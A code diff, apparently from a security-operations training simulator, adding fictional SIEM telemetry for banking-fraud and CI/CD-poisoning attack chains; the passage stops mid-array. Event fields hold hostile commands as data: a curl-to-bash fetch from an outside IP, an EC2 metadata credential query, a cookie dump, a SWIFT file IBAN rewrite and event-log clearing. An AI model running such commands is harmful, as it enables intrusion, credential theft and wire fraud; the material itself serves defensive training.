@@ -363,10 +363,488 @@ const ROCKETSTACK_CRED_STUFFING_STORY = story(
   ["rocketstack"]
 );
 
+// ── Hard-tier content-gap fill (2026-09 content audit) ─────────────────────────
+// QuantumBank had only 4 advanced-fit stories before this batch, RocketStack 8 —
+// both under/at the RECENT_N=8 anti-repeat window, so a Hard-difficulty class at
+// either estate saw the same handful of incidents on repeat. Three hand-authored
+// banking/fraud kill-chains for QuantumBank (SWIFT wire-fraud, fraud-monitoring
+// tampering, CyberArk PAM abuse -> money-mule payout) and three cloud/devops
+// kill-chains for RocketStack (CI/CD pipeline poisoning, Terraform IaC backdoor,
+// SaaS OAuth consent-chaining). Each is explicitly company-restricted (same
+// mechanism as k8s-pod-escape / esxi-ransomware above) so it bypasses the
+// source-fit heuristic and is never offered to a company whose SIEM doesn't
+// carry that vendor. Every raw field uses only that vendor's real schema
+// (CyberArk PAM, Okta, AWS CloudTrail/GuardDuty, Zscaler ZIA, Palo Alto NGFW,
+// CrowdStrike Falcon, GitHub Audit Log, Google Workspace, FortiGate).
+
+// ── QuantumBank Chain E — SWIFT wire-fraud via vendor payment redirect ─────────
+const QB_SWIFT_WIRE_FRAUD: TelemetryEvent[] = [
+  {
+    id: "qbwf1", ts: "2026-06-15T07:50:00.000Z", source: "edr", event_type: "process_create",
+    severity: "medium", vendor: "CrowdStrike Falcon Elite", hostname: "WKS-QB-055", user_email: "p.meier@quantumbank.ch", src_ip: "10.100.1.55",
+    description: "WINWORD.EXE on WKS-QB-055 spawned a hidden, encoded PowerShell command after p.meier opened Treasury_Counterparty_Update.xlsm",
+    mitre_technique: "T1204.002", mitre_tactic: "Execution",
+    process: { name: "powershell.exe", pid: 4471, parent_name: "WINWORD.EXE", parent_pid: 3391, user: "p.meier",
+               cmdline: "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
+               hash: { sha256: "4f9a2b8e7c1d3f6a0b5e9c2d8f7a1b4e6d3f0a9c5b2e8d1f4a7c0b6e9d2f5a83" } },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "crowdstrike.FileName": "powershell.exe", "crowdstrike.FilePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\", "crowdstrike.ParentProcessName": "WINWORD.EXE", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf2", ts: "2026-06-15T07:52:00.000Z", source: "firewall", event_type: "net_connection",
+    severity: "high", vendor: "Palo Alto Networks NGFW", src_ip: "10.100.1.55", dst_ip: "194.36.189.20", dst_port: 443,
+    description: "The PowerShell process on WKS-QB-055 pulled a second-stage payload over HTTPS from 194.36.189.20",
+    mitre_technique: "T1105", mitre_tactic: "Command and Control",
+    raw: { "pan.action": "allow", "pan.app": "ssl", "pan.rule": "ALLOW-OUTBOUND-HTTPS", "destination.ip": "194.36.189.20", "destination.port": "443", "source.ip": "10.100.1.55", "network.protocol": "tcp", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf3", ts: "2026-06-15T07:55:00.000Z", source: "edr", event_type: "process_create",
+    severity: "high", vendor: "CrowdStrike Falcon Elite", hostname: "WKS-QB-055", user_email: "p.meier@quantumbank.ch", src_ip: "10.100.1.55",
+    description: "The downloaded second stage ran as chrome_update.exe on WKS-QB-055 and dumped p.meier's browser-stored Okta session cookie",
+    mitre_technique: "T1539", mitre_tactic: "Credential Access",
+    process: { name: "chrome_update.exe", pid: 5560, parent_name: "powershell.exe", parent_pid: 4471, user: "p.meier",
+               path: "C:\\Users\\p.meier\\AppData\\Local\\Temp\\chrome_update.exe",
+               cmdline: "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch",
+               hash: { sha256: "8c3d1f9a4b7e2c6d0a5f9b3e7c1d4a8f6b0e3d9c2f5a7b1e4d8c0f6a3b9e2d75" } },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch", "crowdstrike.FileName": "chrome_update.exe", "crowdstrike.FilePath": "C:\\Users\\p.meier\\AppData\\Local\\Temp\\", "crowdstrike.ParentProcessName": "powershell.exe", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf4", ts: "2026-06-15T08:04:00.000Z", source: "okta", event_type: "auth_success",
+    severity: "critical", vendor: "Okta", user_email: "p.meier@quantumbank.ch", src_ip: "185.220.101.77",
+    description: "A new Okta session for p.meier was established from 185.220.101.77 using the stolen browser session cookie — no fresh password or MFA prompt",
+    mitre_technique: "T1550.004", mitre_tactic: "Defense Evasion",
+    raw: { "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS", "okta.debugContext.debugData.riskLevel": "CRITICAL", "okta.debugContext.debugData.behaviors": "New Device=POSITIVE, New IP=POSITIVE", "okta.client.ipAddress": "185.220.101.77", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf5", ts: "2026-06-15T08:09:00.000Z", source: "iam", event_type: "privileged_operation",
+    severity: "high", vendor: "CyberArk PAM", user_email: "p.meier@quantumbank.ch", src_ip: "185.220.101.77",
+    description: "Using the hijacked Okta session, p.meier's identity checked out svc-swift-app from the SWIFT-Operations vault with no change ticket attached",
+    mitre_technique: "T1078.002", mitre_tactic: "Privilege Escalation",
+    raw: { "pam.vault.name": "SWIFT-Operations", "pam.account.name": "svc-swift-app@corebanking-app01", "pam.checkout.status": "approved", "access.request.status": "not_required", "cyberark.ticket.required": "true", "cyberark.ticket.provided": "false", "cyberark.session.recorded": "true", "event.action": "credential-checkout", "event.outcome": "success", "user.email": "p.meier@quantumbank.ch", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf6", ts: "2026-06-15T08:14:00.000Z", source: "edr", event_type: "process_create",
+    severity: "critical", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-swift-app@quantumbank.ch", src_ip: "10.100.1.10",
+    description: "Running as svc-swift-app on SRV-QB-ADMIN01, a PowerShell command rewrote the beneficiary IBAN inside the day's outbound SWIFT payment batch file",
+    mitre_technique: "T1565.001", mitre_tactic: "Impact",
+    process: { name: "powershell.exe", pid: 7711, parent_name: "cmd.exe", parent_pid: 7700, user: "svc-swift-app",
+               cmdline: "powershell.exe -Command \"(Get-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml) -replace 'BENEFICIARY_IBAN','LT121000011101001000' | Set-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml\"" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"(Get-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml) -replace 'BENEFICIARY_IBAN','LT121000011101001000' | Set-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentProcessName": "cmd.exe", "crowdstrike.UserName": "svc-swift-app", "crowdstrike.SeverityName": "CRITICAL", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf7", ts: "2026-06-15T08:20:00.000Z", source: "proxy", event_type: "http_request",
+    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
+    description: "A POST to the core-banking SWIFT transfer API submitted a CHF 4.85 million wire to the tampered beneficiary IBAN",
+    mitre_technique: "T1657", mitre_tactic: "Impact",
+    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers", "url.query": "amount_chf=4850000&beneficiary_iban=LT121000011101001000&reference=FX-2026-88231", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf8", ts: "2026-06-15T08:27:00.000Z", source: "iam", event_type: "privileged_operation",
+    severity: "high", vendor: "CyberArk PAM", src_ip: "10.100.1.10",
+    description: "svc-swift-app was checked back in to the vault, but the mandatory PSM session recording for the checkout is missing",
+    mitre_technique: "T1070", mitre_tactic: "Defense Evasion",
+    raw: { "pam.vault.name": "SWIFT-Operations", "pam.account.name": "svc-swift-app@corebanking-app01", "pam.checkout.status": "returned", "session.state": "recording_missing", "cyberark.session.recorded": "false", "event.action": "session-checkin", "event.outcome": "anomalous", "action_result": "allowed" }
+  },
+  {
+    id: "qbwf9", ts: "2026-06-15T08:33:00.000Z", source: "edr", event_type: "process_create",
+    severity: "critical", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-swift-app@quantumbank.ch", src_ip: "10.100.1.10",
+    is_detection: true,
+    description: "wevtutil.exe cl Security ran as svc-swift-app on SRV-QB-ADMIN01 to clear the logon trail; CrowdStrike terminated the process",
+    mitre_technique: "T1070.001", mitre_tactic: "Defense Evasion",
+    process: { name: "wevtutil.exe", pid: 7810, parent_name: "cmd.exe", parent_pid: 7700, user: "svc-swift-app", cmdline: "wevtutil.exe cl Security" },
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "crowdstrike.Tactic": "Defense Evasion", "crowdstrike.SeverityName": "CRITICAL", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed" }
+  },
+  {
+    id: "qbwf10", ts: "2026-06-15T08:37:00.000Z", source: "firewall", event_type: "net_connection",
+    severity: "high", vendor: "Palo Alto Networks NGFW", src_ip: "10.100.1.10", dst_ip: "194.36.189.20", dst_port: 443,
+    description: "A follow-up beacon from SRV-QB-ADMIN01 to 194.36.189.20 was blocked once threat intel tagged the IP as wire-fraud C2",
+    mitre_technique: "T1071.001", mitre_tactic: "Command and Control",
+    raw: { "pan.action": "deny", "pan.rule": "ALLOW-OUTBOUND-HTTPS", "threat.name": "Generic-Wire-Fraud-C2", "threat.severity": "critical", "threat.technique.id": "T1071.001", "destination.ip": "194.36.189.20", "destination.port": "443", "action_result": "blocked" }
+  },
+  {
+    id: "qbwf11", ts: "2026-06-15T08:41:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "high", vendor: "AWS CloudTrail (GovCloud)", src_ip: "194.36.189.20",
+    description: "An attempt to stop logging on the GovCloud CloudTrail trail from 194.36.189.20 was denied by an IAM permission boundary",
+    mitre_technique: "T1562.008", mitre_tactic: "Defense Evasion",
+    raw: { "aws.cloudtrail.eventName": "StopLogging", "aws.cloudtrail.eventSource": "cloudtrail.amazonaws.com", "aws.cloudtrail.errorCode": "AccessDenied", "aws.cloudtrail.errorMessage": "User is not authorized to perform: cloudtrail:StopLogging", "aws.cloudtrail.sourceIPAddress": "194.36.189.20", "action_result": "denied" }
+  },
+];
+
+// ── QuantumBank Chain F — fraud-monitoring / alerting tampering ────────────────
+const QB_FRAUD_MONITORING_TAMPERING: TelemetryEvent[] = [
+  {
+    id: "qbft1", ts: "2026-06-20T22:10:00.000Z", source: "okta", event_type: "auth_success",
+    severity: "medium", vendor: "Okta", user_email: "l.brunner@quantumbank.ch", src_ip: "10.100.1.20",
+    description: "l.brunner signed in to Okta at 22:10 from a device Okta had not seen before — well outside normal working hours",
+    mitre_technique: "T1078", mitre_tactic: "Initial Access",
+    raw: { "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS", "okta.debugContext.debugData.riskLevel": "MEDIUM", "okta.debugContext.debugData.behaviors": "New Device=POSITIVE", "okta.authenticationContext.credentialType": "PASSWORD", "action_result": "allowed" }
+  },
+  {
+    id: "qbft2", ts: "2026-06-20T22:16:00.000Z", source: "iam", event_type: "privileged_operation",
+    severity: "high", vendor: "CyberArk PAM", user_email: "l.brunner@quantumbank.ch", src_ip: "10.100.1.20",
+    description: "l.brunner checked out svc-fraud-monitor from the FraudOps vault outside the approved maintenance window, no ticket attached",
+    mitre_technique: "T1078.002", mitre_tactic: "Privilege Escalation",
+    raw: { "pam.vault.name": "FraudOps", "pam.account.name": "svc-fraud-monitor@qb-siem01", "pam.checkout.status": "approved", "access.request.status": "not_required", "cyberark.ticket.required": "true", "cyberark.ticket.provided": "false", "cyberark.change_window": "outside_window", "event.action": "credential-checkout", "event.outcome": "success", "user.email": "l.brunner@quantumbank.ch", "action_result": "allowed" }
+  },
+  {
+    id: "qbft3", ts: "2026-06-20T22:24:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.20",
+    description: "Using svc-fraud-monitor's assumed role, alarm actions were disabled on the composite alarm qb-fraud-threshold-alerts",
+    mitre_technique: "T1562.001", mitre_tactic: "Defense Evasion",
+    raw: { "aws.cloudtrail.eventName": "DisableAlarmActions", "aws.cloudtrail.eventSource": "monitoring.amazonaws.com", "aws.cloudtrail.requestParameters.alarmNames": "qb-fraud-threshold-alerts", "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-fraud-monitor-role/svc-fraud-monitor", "aws.cloudtrail.awsRegion": "us-gov-west-1", "aws.cloudtrail.sourceIPAddress": "10.100.1.20", "action_result": "allowed" }
+  },
+  {
+    id: "qbft4", ts: "2026-06-20T22:26:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.20",
+    description: "The same session raised the qb-large-wire-alarm reporting threshold from CHF 10,000 to CHF 500,000",
+    mitre_technique: "T1562.001", mitre_tactic: "Defense Evasion",
+    raw: { "aws.cloudtrail.eventName": "PutMetricAlarm", "aws.cloudtrail.eventSource": "monitoring.amazonaws.com", "aws.cloudtrail.requestParameters.alarmName": "qb-large-wire-alarm", "aws.cloudtrail.requestParameters.threshold": "500000", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-fraud-monitor-role/svc-fraud-monitor", "aws.cloudtrail.sourceIPAddress": "10.100.1.20", "action_result": "allowed" }
+  },
+  {
+    id: "qbft5", ts: "2026-06-20T22:31:00.000Z", source: "edr", event_type: "process_create",
+    severity: "high", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-fraud-monitor@quantumbank.ch", src_ip: "10.100.1.10",
+    description: "Running as svc-fraud-monitor on SRV-QB-ADMIN01, PowerShell stopped the local SIEM forwarder service",
+    mitre_technique: "T1562.001", mitre_tactic: "Defense Evasion",
+    process: { name: "powershell.exe", pid: 8802, parent_name: "cmd.exe", parent_pid: 8800, user: "svc-fraud-monitor", cmdline: "powershell.exe -Command \"Stop-Service -Name SplunkForwarder -Force\"" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Stop-Service -Name SplunkForwarder -Force\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentProcessName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+  },
+  {
+    id: "qbft6", ts: "2026-06-20T22:40:00.000Z", source: "proxy", event_type: "http_request",
+    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
+    description: "A CHF 480,000 wire cleared through the SWIFT transfer API without triggering an alert, thanks to the raised threshold",
+    mitre_technique: "T1657", mitre_tactic: "Impact",
+    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers", "url.query": "amount_chf=480000&beneficiary_iban=HR1210010051863000160", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
+  },
+  {
+    id: "qbft7", ts: "2026-06-20T22:49:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "high", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.20",
+    description: "Nine minutes after the transfer cleared, the qb-large-wire-alarm threshold was restored to its original CHF 10,000 value",
+    mitre_technique: "T1070", mitre_tactic: "Defense Evasion",
+    raw: { "aws.cloudtrail.eventName": "PutMetricAlarm", "aws.cloudtrail.eventSource": "monitoring.amazonaws.com", "aws.cloudtrail.requestParameters.alarmName": "qb-large-wire-alarm", "aws.cloudtrail.requestParameters.threshold": "10000", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-fraud-monitor-role/svc-fraud-monitor", "aws.cloudtrail.sourceIPAddress": "10.100.1.20", "action_result": "allowed" }
+  },
+  {
+    id: "qbft8", ts: "2026-06-20T22:51:00.000Z", source: "edr", event_type: "process_create",
+    severity: "medium", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-fraud-monitor@quantumbank.ch", src_ip: "10.100.1.10",
+    description: "The SIEM forwarder service was restarted on SRV-QB-ADMIN01 moments after the alarm threshold was restored",
+    mitre_technique: "T1070", mitre_tactic: "Defense Evasion",
+    process: { name: "powershell.exe", pid: 8830, parent_name: "cmd.exe", parent_pid: 8800, user: "svc-fraud-monitor", cmdline: "powershell.exe -Command \"Start-Service -Name SplunkForwarder\"" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Start-Service -Name SplunkForwarder\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentProcessName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
+  },
+  {
+    id: "qbft9", ts: "2026-06-20T22:58:00.000Z", source: "iam", event_type: "privileged_operation",
+    severity: "high", vendor: "CyberArk PAM", src_ip: "10.100.1.10",
+    description: "svc-fraud-monitor was checked back in, but the PSM session recording for the entire window is flagged incomplete",
+    mitre_technique: "T1562.001", mitre_tactic: "Defense Evasion",
+    raw: { "pam.vault.name": "FraudOps", "pam.account.name": "svc-fraud-monitor@qb-siem01", "pam.checkout.status": "returned", "session.state": "recording_incomplete", "cyberark.session.recorded": "false", "event.action": "session-checkin", "event.outcome": "anomalous", "action_result": "allowed" }
+  },
+];
+
+// ── QuantumBank Chain G — CyberArk PAM abuse → money-mule payout (structuring) ─
+const QB_CYBERARK_MULE_PAYOUT: TelemetryEvent[] = [
+  {
+    id: "qbmp1", ts: "2026-06-25T13:00:00.000Z", source: "okta", event_type: "auth_success",
+    severity: "medium", vendor: "Okta", user_email: "e.steiner@quantumbank.ch", src_ip: "89.44.168.201",
+    description: "e.steiner's Okta sign-in from 89.44.168.201 was flagged MEDIUM risk; a step-up Okta Verify push was approved from the same new device 40 seconds later",
+    mitre_technique: "T1078", mitre_tactic: "Initial Access",
+    raw: { "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS", "okta.debugContext.debugData.riskLevel": "MEDIUM", "okta.debugContext.debugData.behaviors": "New Device=POSITIVE, New IP=POSITIVE", "okta.client.ipAddress": "89.44.168.201", "action_result": "allowed" }
+  },
+  {
+    id: "qbmp2", ts: "2026-06-25T13:07:00.000Z", source: "iam", event_type: "privileged_operation",
+    severity: "high", vendor: "CyberArk PAM", user_email: "e.steiner@quantumbank.ch", src_ip: "10.100.1.44",
+    description: "e.steiner's identity checked out svc-corebanking-admin from the CoreBankingAdmins vault outside the approved change window",
+    mitre_technique: "T1078.002", mitre_tactic: "Privilege Escalation",
+    raw: { "pam.vault.name": "CoreBankingAdmins", "pam.account.name": "svc-corebanking-admin@corebanking-db01", "pam.checkout.status": "approved", "access.request.status": "not_required", "cyberark.ticket.required": "true", "cyberark.ticket.provided": "false", "event.action": "credential-checkout", "event.outcome": "success", "user.email": "e.steiner@quantumbank.ch", "action_result": "allowed" }
+  },
+  {
+    id: "qbmp3", ts: "2026-06-25T13:11:00.000Z", source: "iam", event_type: "privileged_operation",
+    severity: "high", vendor: "CyberArk PAM", src_ip: "10.100.1.44",
+    description: "The PSM session opened for svc-corebanking-admin shows session recording disabled before connecting to the core-banking admin console",
+    mitre_technique: "T1562.001", mitre_tactic: "Defense Evasion",
+    raw: { "pam.vault.name": "CoreBankingAdmins", "pam.account.name": "svc-corebanking-admin@corebanking-db01", "pam.session.type": "PSM-RDP", "session.state": "recording_disabled", "cyberark.session.recorded": "false", "event.action": "session-start", "event.outcome": "anomalous", "action_result": "allowed" }
+  },
+  {
+    id: "qbmp4", ts: "2026-06-25T13:18:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail (GovCloud)", src_ip: "10.100.1.44",
+    description: "An ExecuteStatement call via the RDS Data API inserted a new, pre-approved beneficiary directly into the core-banking database, bypassing maker-checker",
+    mitre_technique: "T1565.001", mitre_tactic: "Impact",
+    raw: { "aws.cloudtrail.eventName": "ExecuteStatement", "aws.cloudtrail.eventSource": "rds-data.amazonaws.com", "aws.cloudtrail.requestParameters.resourceArn": "arn:aws:rds:eu-central-2:552134008821:cluster:qb-corebanking-cluster", "aws.cloudtrail.requestParameters.sql": "INSERT INTO beneficiaries (iban, name, approved) VALUES ('RO49AAAA1B31007593840000','Silver Fern Trading Ltd',1)", "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::552134008821:assumed-role/qb-corebanking-admin-role/svc-corebanking-admin", "aws.cloudtrail.sourceIPAddress": "10.100.1.44", "action_result": "allowed" }
+  },
+  {
+    id: "qbmp5", ts: "2026-06-25T13:24:00.000Z", source: "proxy", event_type: "http_request",
+    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
+    description: "A CHF 9,850 wire — just under the CHF 10,000 reporting threshold — was sent to the newly-inserted beneficiary",
+    mitre_technique: "T1657", mitre_tactic: "Impact",
+    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers", "url.query": "amount_chf=9850&beneficiary_iban=RO49AAAA1B31007593840000", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
+  },
+  {
+    id: "qbmp6", ts: "2026-06-25T13:36:00.000Z", source: "proxy", event_type: "http_request",
+    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
+    description: "11 further sub-threshold wires totalling CHF 108,000 were sent to the same beneficiary over the next 40 minutes — classic structuring",
+    mitre_technique: "T1657", mitre_tactic: "Impact",
+    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers/batch", "url.query": "count=11&total_amount_chf=108000&beneficiary_iban=RO49AAAA1B31007593840000", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
+  },
+  {
+    id: "qbmp7", ts: "2026-06-25T14:20:00.000Z", source: "iam", event_type: "privileged_operation",
+    severity: "high", vendor: "CyberArk PAM", src_ip: "10.100.1.44",
+    description: "svc-corebanking-admin was checked back in; the vault confirms the PSM recording for the session is missing",
+    mitre_technique: "T1070", mitre_tactic: "Defense Evasion",
+    raw: { "pam.vault.name": "CoreBankingAdmins", "pam.account.name": "svc-corebanking-admin@corebanking-db01", "pam.checkout.status": "returned", "session.state": "recording_missing", "cyberark.session.recorded": "false", "event.action": "session-checkin", "event.outcome": "anomalous", "action_result": "allowed" }
+  },
+  {
+    id: "qbmp8", ts: "2026-06-25T14:26:00.000Z", source: "edr", event_type: "process_create",
+    severity: "critical", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-corebanking-admin@quantumbank.ch", src_ip: "10.100.1.10",
+    is_detection: true,
+    description: "wevtutil.exe cl Security ran as svc-corebanking-admin on SRV-QB-ADMIN01; CrowdStrike terminated the process",
+    mitre_technique: "T1070.001", mitre_tactic: "Defense Evasion",
+    process: { name: "wevtutil.exe", pid: 7920, parent_name: "cmd.exe", parent_pid: 7900, user: "svc-corebanking-admin", cmdline: "wevtutil.exe cl Security" },
+    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "crowdstrike.Tactic": "Defense Evasion", "crowdstrike.SeverityName": "CRITICAL", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed" }
+  },
+  {
+    id: "qbmp9", ts: "2026-06-25T14:31:00.000Z", source: "firewall", event_type: "net_connection",
+    severity: "high", vendor: "Palo Alto Networks NGFW", src_ip: "10.100.1.10", dst_ip: "45.155.205.90", dst_port: 443,
+    description: "An outbound connection from SRV-QB-ADMIN01 to a known money-laundering-network indicator was blocked",
+    mitre_technique: "T1071.001", mitre_tactic: "Command and Control",
+    raw: { "pan.action": "deny", "pan.rule": "ALLOW-OUTBOUND-HTTPS", "threat.name": "MoneyMule-Network-Infra", "threat.severity": "high", "threat.technique.id": "T1071.001", "destination.ip": "45.155.205.90", "destination.port": "443", "action_result": "blocked" }
+  },
+];
+
+// ── RocketStack Chain E — CI/CD pipeline poisoning via self-hosted GitHub Actions runner ─
+const RS_CICD_PIPELINE_POISONING: TelemetryEvent[] = [
+  {
+    id: "rscp1", ts: "2026-06-18T09:00:00.000Z", source: "vcs", event_type: "policy_modification",
+    severity: "high", vendor: "GitHub", user_email: "j.lee@rocketstack.io",
+    description: "A PR merged into rocketstack-io/api-gateway added a curl-pipe-to-bash step to .github/workflows/deploy.yml",
+    mitre_technique: "T1195.002", mitre_tactic: "Initial Access",
+    raw: { "github.audit.action": "pull_request.merge", "github.audit.actor": "j.lee", "github.audit.repo": "rocketstack-io/api-gateway", "github.audit.base_ref": "main", "github.audit.head_ref": "chore/ci-speedup", "github.audit.merge_commit_sha": "9f2a3c1e8d7b6a5c4d3e2f1a0b9c8d7e6f5a4b3c", "github.workflow.path": ".github/workflows/deploy.yml", "github.workflow.diff_added_lines": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "event.action": "pull_request.merge", "event.outcome": "success", "user.name": "j.lee" }
+  },
+  {
+    id: "rscp2", ts: "2026-06-18T09:04:00.000Z", source: "vcs", event_type: "privileged_operation",
+    severity: "medium", vendor: "GitHub", hostname: "SRV-PROD-001",
+    description: "GitHub Actions ran the poisoned deploy.yml workflow on the self-hosted runner SRV-PROD-001",
+    mitre_technique: "T1195.002", mitre_tactic: "Execution",
+    raw: { "github.actions.workflow_name": "deploy.yml", "github.actions.run_id": "18294031882", "github.actions.runner_name": "SRV-PROD-001", "github.actions.runner_type": "self-hosted", "github.actions.repository": "rocketstack-io/api-gateway", "github.actions.head_sha": "9f2a3c1e8d7b6a5c4d3e2f1a0b9c8d7e6f5a4b3c", "github.actions.conclusion": "success", "event.action": "workflow_run.completed", "event.outcome": "success" }
+  },
+  {
+    id: "rscp3", ts: "2026-06-18T09:04:30.000Z", source: "edr", event_type: "process_create",
+    severity: "high", vendor: "CrowdStrike Falcon", hostname: "SRV-PROD-001", user_email: "ci-pipeline@rocketstack.io", src_ip: "172.16.10.50",
+    description: "The workflow step executed a curl-pipe-to-bash one-liner on SRV-PROD-001 as the ci-pipeline user",
+    mitre_technique: "T1059.004", mitre_tactic: "Execution",
+    process: { name: "bash", pid: 41210, parent_name: "sh", parent_pid: 41200, user: "ci-pipeline", cmdline: "curl -sSL http://185.220.101.42/bootstrap.sh | bash" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "crowdstrike.FileName": "bash", "crowdstrike.ParentProcessName": "sh", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+  },
+  {
+    id: "rscp4", ts: "2026-06-18T09:05:10.000Z", source: "edr", event_type: "process_create",
+    severity: "high", vendor: "CrowdStrike Falcon", hostname: "SRV-PROD-001", user_email: "ci-pipeline@rocketstack.io", src_ip: "172.16.10.50",
+    description: "bootstrap.sh queried the EC2 instance metadata service for the attached IAM role's temporary credentials",
+    mitre_technique: "T1552.005", mitre_tactic: "Credential Access",
+    process: { name: "curl", pid: 41230, parent_name: "bash", parent_pid: 41210, user: "ci-pipeline", cmdline: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rocketstack-ci-deploy-role" },
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rocketstack-ci-deploy-role", "crowdstrike.FileName": "curl", "crowdstrike.ParentProcessName": "bash", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+  },
+  {
+    id: "rscp5", ts: "2026-06-18T09:07:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS GuardDuty", src_ip: "185.220.101.42",
+    is_detection: true,
+    description: "GuardDuty raised InstanceCredentialExfiltration.OutsideAWS: SRV-PROD-001's instance-role credentials were used from an external IP",
+    mitre_technique: "T1552.005", mitre_tactic: "Credential Access",
+    raw: { "aws.guardduty.type": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS", "aws.guardduty.severity": "8.0", "aws.guardduty.title": "EC2 instance credentials are being used from an external IP address.", "aws.cloudtrail.awsRegion": "us-east-1", "action_result": "detected" }
+  },
+  {
+    id: "rscp6", ts: "2026-06-18T09:09:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
+    severity: "critical", vendor: "AWS CloudTrail", src_ip: "185.220.101.42",
+    description: "The stolen instance-role credentials called GetCallerIdentity from 185.220.101.42, confirming they were valid off-host",
+    mitre_technique: "T1078.004", mitre_tactic: "Defense Evasion",
